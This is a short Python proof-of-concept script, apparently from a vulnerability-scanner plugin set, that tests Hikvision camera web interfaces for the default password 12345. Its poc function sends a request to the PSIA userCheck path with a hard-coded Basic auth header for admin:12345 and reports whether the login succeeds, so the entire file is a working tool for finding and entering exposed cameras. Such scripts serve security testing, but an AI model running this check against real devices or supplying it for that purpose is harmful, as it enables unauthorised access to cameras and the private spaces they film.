#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 海康威视web弱口令
referer: http://www.myhack58.com/Article/html/2/5/2014/55637.htm
author: Lucifer
description: 海康威视摄像头web界面存在通用弱口令12345。
'''
import sys
import requests



def poc(url):
	if 'http' not in url:
		url = 'http://' + url
	headers = {
		"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
		"Authorization":"Basic YWRtaW46MTIzNDU="
	}
	payload = '/PSIA/Custom/SelfExt/userCheck'
	vulnurl = url + payload
	try:
		req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
		if r"<statusValue>200" in req.text and r"<statusString>OK" in req.text:
			return True
		else:
			return False
	except:
		return False

